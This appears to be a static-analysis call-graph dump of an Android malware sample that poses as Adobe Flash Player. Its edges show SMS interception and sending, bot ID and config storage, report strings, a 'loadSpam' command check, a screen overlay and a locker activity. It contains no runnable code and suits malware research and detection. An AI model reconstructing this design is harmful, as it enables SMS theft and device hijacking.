VIRTUAL edge: $r24 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r7 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r20 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("loadSpam") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.ZLocker: boolean requestWindowFeature(int)>(1) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: boolean requestWindowFeature(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r36 = virtualinvoke r3.<java.io.File: java.io.File[] listFiles()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.io.File[] listFiles()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void startActivityForResult(android.content.Intent,int)>(r2, 1) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void startActivityForResult(android.content.Intent,int)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r16 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r34 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r16.<android.view.WindowManager$LayoutParams: void <init>(int,int,int,int,int)>($i0, $i1, 2003, 262144, $i2) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.view.WindowManager$LayoutParams: void <init>(int,int,int,int,int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.packages.BK: void <init>()> ==> <android.app.Activity: void <init>()>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onDestroy()>() in <com.adobe.flashplayer_.MacrosStat: void onDestroy()> ==> <android.app.Service: void onDestroy()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)>
STATIC edge: r30 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/sent") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\rTalkTime: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r24.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void stopSelf()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.app.Service: void stopSelf()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r6.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void <init>()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotID", r6) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
CLINIT edge: staticinvoke <android.view.WindowManager$LayoutParams: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.WindowManager$LayoutParams: void <clinit>()>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)>($r1) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "Reich_ServerGate", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r6, r8, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)>(0, 0, null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: void setContentView(int)>(2130903040) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r18 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotVer") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r24, r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r21.<java.lang.String: int length()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void setContentView(int)>(2130903041) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=out_sms&i=sms") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
CLINIT edge: staticinvoke <android.app.Activity: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.app.Activity: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotVer") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r11.<java.lang.String: int indexOf(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeZCore: android.content.ComponentName startService(android.content.Intent)>($r1) in <com.adobe.flashplayer_.AdobeZCore: void onDestroy()> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n-----\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r59.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r7, "OFF") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeZCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: android.content.Intent getIntent()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("a") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
